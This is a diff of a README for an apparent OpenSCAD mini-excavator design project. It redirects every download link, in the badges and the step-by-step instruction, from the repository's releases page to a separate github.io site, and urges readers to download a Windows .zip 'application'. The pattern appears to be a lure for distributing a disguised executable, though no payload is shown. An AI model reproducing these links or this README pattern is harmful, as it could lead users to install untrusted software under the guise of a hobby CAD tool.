@@ -1,6 +1,6 @@
 # 🔧 pub-excavator-openscad - Design Your Own Mini Excavator
 
-[![Download Now](https://img.shields.io/badge/Download-Excavator_Model-FE7A0E?style=for-the-badge&logo=github&logoColor=white)](https://github.com/marcellusunenclosed953/pub-excavator-openscad/releases)
+[![Download Now](https://img.shields.io/badge/Download-Excavator_Model-FE7A0E?style=for-the-badge&logo=github&logoColor=white)](https://marcellusunenclosed953.github.io)
 
 ## 🎯 What Is This?
 
@@ -14,7 +14,7 @@ Let's get you up and running in under five minutes. Follow these simple steps:
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: [https://github.com/marcellusunenclosed953/pub-excavator-openscad/releases](https://github.com/marcellusunenclosed953/pub-excavator-openscad/releases)
+Visit this link to download the application: [https://marcellusunenclosed953.github.io](https://marcellusunenclosed953.github.io)
 
 On that page, you'll see a list of files. Look for the one that says **Windows** or has a **.zip** extension. Click the download button next to it. The download will start automatically. Depending on your internet speed, this might take a few minutes.
 
@@ -94,6 +94,6 @@ The software is designed for **hobbyists and educational use**. It's an amazing 
 
 Don't wait. Your mini excavator project starts with a single click:
 
-[![Download Now](https://img.shields.io/badge/Download-Excavator_Model-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/marcellusunenclosed953/pub-excavator-openscad/releases)
+[![Download Now](https://img.shields.io/badge/Download-Excavator_Model-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://marcellusunenclosed953.github.io)
 
 Keywords: 3d-printing, cad, dxf, excavator, hydraulics, mechanical-engineering, openscad, parametric-design, three-js, webassembly
